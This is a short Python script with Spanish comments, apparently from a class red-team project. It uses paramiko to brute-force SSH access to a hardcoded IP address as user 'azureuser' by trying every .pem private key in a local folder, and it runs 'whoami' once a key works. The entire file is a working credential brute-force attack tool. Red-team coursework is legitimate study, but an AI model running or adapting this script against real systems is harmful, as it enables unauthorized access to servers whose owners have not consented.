import paramiko
import os
import time

#Atributos a usar en el ataque 
HOSTNAME = "20.97.176.130"
USER = "azureuser"
FOLDER_KEYS = "Clase\\Prubas_proyecto\\proyecto\\red_team\\mis_llaves" #ruta donde se encuentra la carpeta con el contenido de las llaves

def brute_force_keys():
    #listado de los archivos a analizar
    #si no encuentra el archivo realiza un print correspondiente
    if not os.path.exists(FOLDER_KEYS):
        print(f"[!] La carpeta {FOLDER_KEYS} no existe.")
        return

    llaves = [f for f in os.listdir(FOLDER_KEYS) if f.endswith('.pem')]
    print(f"[*] Iniciando ataque. Se probarán {len(llaves)} llaves...\n")

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    #comienza el análisis de los archivos que contienen las llaves
    for nombre_llave in llaves:
        ruta_completa = os.path.join(FOLDER_KEYS, nombre_llave)
        
        try:
            print(f"[-] Probando llave: {nombre_llave}...", end="\r")
            #conexión ssh
            client.connect(
                hostname=HOSTNAME,
                username=USER,
                key_filename=ruta_completa,
                timeout=5
            )
            
        #salida si se hayaron coincidencias
            print(f"\n\n[+] ¡ACCESO CONCEDIDO!")
            print(f"[+] La llave correcta es: {nombre_llave}")
            
            #funciones de paramiko el client.exec command envia el comando whoami al host que se conecta
            stdin, stdout, stderr = client.exec_command("whoami")
            print(f"[+] Usuario en el sistema: {stdout.read().decode()}")#muestra info legible
            #stdin, stdout, stderr son los estandares a responder 
            client.close()
            break # Detener el ataque porque ya entramos
        #trato de errores para que no pare y siga intentando la verificacion 
        except paramiko.AuthenticationException:

            continue
        except Exception as e:
            print(f"\n[!] Error con {nombre_llave}: {e}")
#ejecuta el codigo 
if __name__ == "__main__":
    brute_force_keys()
